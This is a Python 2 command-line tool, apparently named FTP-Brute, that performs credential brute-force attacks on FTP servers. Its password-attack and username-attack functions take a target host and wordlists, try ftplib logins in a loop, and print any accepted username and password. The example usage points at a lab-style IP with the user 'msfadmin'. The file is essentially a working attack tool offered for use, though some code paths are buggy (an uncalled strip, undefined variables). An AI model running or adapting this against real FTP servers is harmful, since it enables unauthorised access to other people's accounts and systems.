#!/usr/bin/python2
###############################
import sys, optparse, platform
import socket, ftplib
sys.path.append('./lib/')
import core_ftpbr
##############################
opsys = platform.system()
usage_utama = "[?] Use 'FTP-Brute.py --help' to show Help Contents"
##############################
def crack_password(targetnya,portnya,usernamenya,passwordnya,timeoutnya):
	core_ftpbr.clearscreen(opsys)
	core_ftpbr.judul()
	print "[#]==============={ PASSWORD ATTACK }===============[#]"
	print " |--[+] TARGET    : %s" % targetnya
	print " |--[+] PORT      : %s" % portnya
	print " |--[+] TIMEOUT   : %s" % timeoutnya
	print " |--[+] USERNAME  : %s" % usernamenya
	print " |--[+] PASS_FILE : %s" % passwordnya
	print "[#]=================================================[#]"
	print " |"
	print " |--[*] Getting IP Address..."
	try:
		ftpbr_ip = socket.gethostbyname(targetnya)
		print " |   |--[+] IP Address : %s" % ftpbr_ip
	except:
		print core_ftpbr.err_cantcon
		exit()
	print " |"
	print " |--[*] Checking if Port {} is Open...".format(portnya)
	core_konek = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	core_konek.settimeout(1)
	hasil_konek = core_konek.connect_ex((ftpbr_ip,int(portnya)))
	if hasil_konek == 0:
		print " |   |--[+] Port {} is Open !".format(portnya)
		core_konek.close()
	else:
		print core_ftpbr.err_cantconp
		quit()
	print " |"
	print " |--[*] Preparing Wordlist..."
	try:
		buka = open(str(passwordnya),'r')
		print " |   |--[+] Wordlist Opened..."
	except:
		print core_ftpbr.err_bukalst
		exit()
	try:
		baca = buka.readlines()
		print " |   |--[+] Wordlist Read..."
	except:
		print core_ftpbr.err_bacalst
		exit()
	jumlah = str(len(baca))
	hitung = 0
	print " |   |--[+] {} Word-Phrase Loaded...".format(jumlah)
	print " |"
	print "[#]============={ START ATTACKING ... }=============[#]"
	print " |"
	if int(portnya) == 21:
		for a in baca:
			b = a.strip()
			hitung += 1
			try:
				core = ftplib.FTP(ftpbr_ip,timeout=float(timeoutnya))
				core.login(str(usernamenya),str(b))
				core.quit()
				print "[ ACCEPTED ]===[{0}/{1}]===[USERNAME : {2}]===[PASSWORD : {3}]".format(hitung,jumlah,usernamenya,b)
				break
			except:
				print "[ INVALID ]===[{0}/{1}]===[USERNAME : {2}]===[PASSWORD : {3}]".format(hitung,jumlah,usernamenya,b)
		core_ftpbr.keluar()
	if int(portnya) != 21:
		for a in baca:
			b = a.strip
			try:
				core = ftplib.FTP()
				core.connect(ftpbr_ip,int(portnya))
				core.login(str(usernamenya),str(b))
				core.quit()
				print "[ ACCEPTED ]===[{0}/{1}]===[USERNAME : {2}]===[PASSWORD : {3}]".format(hitung,jumlah,usernamenya,b)
				break
			except:
				print "[ INVALID ]===[{0}/{1}]===[USERNAME : {2}]===[PASSWORD : {3}]".format(hitung,jumlah,usernamenya,b)
		core_ftpbr.keluar()	
def crack_username(targetnya,portnya,usernamenya,passwordnya,timeoutnya):
	core_ftpbr.clearscreen(opsys)
	core_ftpbr.judul()
	print "[#]==============={ USERNAME ATTACK }===============[#]"
	print " |--[+] TARGET    : %s" % targetnya
	print " |--[+] PORT      : %s" % portnya
	print " |--[+] TIMEOUT   : %s" % timeoutnya
	print " |--[+] USER_FILE : %s" % usernamenya
	print " |--[+] PASSWORD  : %s" % passwordnya
	print "[#]=================================================[#]"
	print " |"
	print " |--[*] Getting IP Address..."
	try:
		ftpbr_ip = socket.gethostbyname(targetnya)
		print " |   |--[+] IP Address : %s" % ftpbr_ip
	except:
		print core_ftpbr.err_cantcon
		exit()
	print " |"
	print " |--[*] Checking if Port {} is Open...".format(portnya)
	core_konek = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	core_konek.settimeout(1)
	hasil_konek = core_konek.connect_ex((ftpbr_ip,int(portnya)))
	if hasil_konek == 0:
		print " |   |--[+] Port {} is Open !".format(portnya)
		core_konek.close()
	else:
		print core_ftpbr.err_cantconp
		quit()
	print " |"
	print " |--[*] Preparing Wordlist..."
	try:
		buka = open(str(usernamenya),'r')
		print " |   |--[+] Wordlist Opened..."
	except:
		print core_ftpbr.err_bukalst
		exit()
	try:
		baca = buka.readlines()
		print " |   |--[+] Wordlist Read..."
	except:
		print core_ftpbr.err_bacalst
		exit()
	jumlah = str(len(baca))
	hitung = 0
	print " |   |--[+] {} Word-Phrase Loaded...".format(jumlah)
	print " |"
	print "[#]============={ START ATTACKING ... }=============[#]"
	print " |"
	if int(portnya) == 21:
		for a in baca:
			b = a.strip()
			hitung += 1
			try:
				core = ftplib.FTP(ftpbr_ip,timeout=float(timeoutnya))
				core.login(str(b),str(passwordnya))
				core.quit()
				print "[ ACCEPTED ]===[{0}/{1}]===[USERNAME : {2}]===[PASSWORD : {3}]".format(hitung,jumlah,b,passwordnya)
				break
			except:
				print "[ INVALID ]===[{0}/{1}]===[USERNAME : {2}]===[PASSWORD : {3}]".format(hitung,jumlah,b,passwordnya)
		core_ftpbr.keluar()
	if int(portnya) != 21:
		for a in baca:
			b = a.strip
			try:
				core = ftplib.FTP()
				core.connect(ftpbr_ip,int(portnya))
				core.login(str(b),str(passwordnya))
				core.quit()
				print "[ ACCEPTED ]===[{0}/{1}]===[USERNAME : {2}]===[PASSWORD : {3}]".format(hitung,jumlah,b,passwordnya)
				break
			except:
				print "[ INVALID ]===[{0}/{1}]===[USERNAME : {2}]===[PASSWORD : {3}]".format(hitung,jumlah,b,passwordnya)
		core_ftpbr.keluar()
def login_langsung(targetnya,portnya,usernamenya,passwordnya,timeoutnya):
	core_ftpbr.clearscreen(opsys)
	core_ftpbr.judul()
	print "[#]==============={ LOGIN }===============[#]"
	print " Username and Password is specified...Try to"
	print " Login with available Username and Password"
	print "[#]==========={ ATTEMPT LOGIN }===========[#]"
	print ""
	print "[*] Getting IP Address..."
	try:
		ftpbr_ip = socket.gethostbyname(targetnya)
		print "[+] IP Address : %s" % ftpbr_ip
	except:
		print core_ftpbr.err_cantcon
		quit()
	print ""
	print "[*] Checking if Port {} is Open...".format(portnya)
	core_konek = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	core_konek.settimeout(1)
	hasil_konek = core_konek.connect_ex((ftpbr_ip,int(portnya)))
	if hasil_konek == 0:
		print "[+] Port {} is Open !".format(portnya)
		core_konek.close()
	else:
		print core_ftpbr.err_cantconp
		quit()	
	print ""
	mencoba = True
	if int(portnya) != 21:
		while(mencoba):
			print "[*] Try Login --->  [{0}]:[{1}]".format(usernamenya,passwordnya)
			try:
				core = ftplib.FTP()
				core.connect(ftpbr_ip,int(portnya))
				core.login(username,password)
				print "[+] Login Success !!!"
				core.quit()
				break
			except:
				print "[-] Login Failed !!!"
				print "    Invalid Username and Password !!!"
				exit()
		core_ftpbr.keluar()
	elif int(portnya) == 21:
		while(mencoba):
			print "[*] Try Login ---> [{0}]:[{1}]".format(usernamenya,passwordnya)
			try:
				core = ftplib.FTP(ftpbr_ip,timeout=float(timeoutnya))
				core.login(str(usernamenya),str(passwordnya))
				print "[+] Login Success !!!"
				core.quit()
				break
			except:
				print "[-] Login Failed..."
				print "    Invalid Username or Password"
				exit()
		core_ftpbr.keluar()
def main():
	ftpbr_port = 21
	ftpbr_timeout = 0.3
	core_ftpbr.clearscreen(opsys)
	### END OF ### VARIABEL UTAMA ###
	core_ftpbr.judul()
	try:
		if sys.argv[1] == "-h" or "--help":
			print "[X] Ex: FTP-Brute.py --host 192.168.229.128 -u msfadmin -P /root/Wordlist/password.txt"
			print "        FTP-Brute.py --host 192.168.229.128 -U /root/username.txt -P /root/password.txt"
			print ""
	except IndexError:
		None
	parser = optparse.OptionParser()
	parser.add_option("--host",dest="TARGET",help="IP Address/Domain of Target")
	parser.add_option("--port",dest="PORT",help="FTP Port (Default:21) [OPTIONAL]")
	parser.add_option("-u",dest="USERNAME",help="Specify the Username")
	parser.add_option("--username",dest="USERNAME",help="Specify the Username")
	parser.add_option("-U",dest="USER_FILE",help="File contains Username for Username Cracking")
	parser.add_option("-p",dest="PASSWORD",help="Specify the Password")
	parser.add_option("--password",dest="PASSWORD",help="Specify the Password")
	parser.add_option("-P",dest="PASS_FILE",help="File contains Password for Password Cracking")
	parser.add_option("--timeout",dest="TIMEOUT",help="Timeout for Login attempt (Default:0.3) [OPTIONAL]")
	(options,args) = parser.parse_args()
	if options.TARGET == None:
		print usage_utama
		exit()
	try:
		# ATURAN LAIN
		if (bool(options.TARGET) == True):
			ftpbr_target = options.TARGET
		if (bool(options.PORT) == True):
			ftpbr_port = options.PORT
			default_port = False
		if (bool(options.TIMEOUT) == True):
			ftpbr_timeout = options.TIMEOUT
		# ATUR TIPE SERANGAN
		# LOGIN LANGSUNG
		if (bool(options.USERNAME ) == True) and (bool(options.PASSWORD) == True):
			login_langsung(ftpbr_target,ftpbr_port,options.USERNAME,options.PASSWORD,ftpbr_timeout)
		# BOBOL PASSWORD
			# ADA USERNAME, ADA PASS FILE
		if (bool(options.USERNAME ) == True) and (bool(options.PASS_FILE) == True):
			crack_password(ftpbr_target,ftpbr_port,options.USERNAME,options.PASS_FILE,ftpbr_timeout)
			# ADA USERNAME, NGAK ADA PASS FILE
		#if (bool(options.USERNAME ) == True) and (bool(options.PASS_FILE) == False):
		#	ftpbr_wlist = './wordlist/mxact666_password.txt'
		#	crack_password(ftpbr_target,ftpbr_port,options.USERNAME,ftpbr_wlist,ftpbr_timeout)
		# BOBOL USERNAME
			# ADA USERFILE, ADA PASSWORD
		if (bool(options.USER_FILE) == True) and (bool(options.PASSWORD) == True):
			crack_username(ftpbr_target,ftpbr_port,options.USER_FILE,options.PASSWORD,ftpbr_timeout)
			# NGAK ADA USERFILE, ADA PASSWORD
		#if (bool(options.USER_FILE) == False) and (bool(options.PASSWORD) == True):
		#	ftpbr_userfile = './wordlist/mxact666_username.txt'
		#	crack_username(ftpbr_target,ftpbr_port,ftpbr_userfile,options.PASSWORD,ftpbr_timeout)
		# BOBOL DUA DUA NYA
			# KALAU NGAK ADA PASS FILE
		#if (bool(options.USER_FILE) == True) and (bool(options.PASS_FILE) == False):
		#	ftpbr_wlist = './wordlist/mxact666_password.txt'
		#	crack_userpass(ftpbr_target,ftpbr_port,options.USER_FILE,ftpbr_wlist,ftpbr_timeout)
			# KALAU NGAK ADA USER FILE
		#if (bool(options.USER_FILE) == False) and (bool(options.PASS_FILE) == True):
		#	ftpbr_userfile = './wordlist/mxact666_username.txt'
		#	crack_userpass(ftpbr_target,ftpbr_port,ftpbr_userfile,options.PASS_FILE,ftpbr_timeout)
			# ADA DUA DUA NYA
		if (bool(options.USER_FILE) == True) and (bool(options.PASS_FILE) == True):
			print ""
			print "[LOLOLOLOL] Hehehe...sorry, I forget to create this Modules for crack both of"
			print "            the Username and Password"
			print "Just try Crack one of it...crack the Password ? or crack the Username ?"
			print "Hehehe...sorry about this...wait for the Next Version :)"
			exit()
			#crack_userpass(ftpbr_target,ftpbr_port,options.USER_FILE,options.PASS_FILE,ftpbr_timeout)
			# NGAK ADA DUA DUA NYA
		#if (bool(options.USER_FILE) == False) and (bool(options.PASS_FILE) == False):
		#	ftpbr_wlist = './wordlist/mxact666_password.txt'
		#	ftpbr_userfile = './wordlist/mxact666_username.txt'
		#	crack_userpass(ftpbr_target,ftpbr_port,ftpbr_userfile,ftpbr_wlist,ftpbr_timeout)
	except:
		None
	
if __name__ == '__main__':
	main()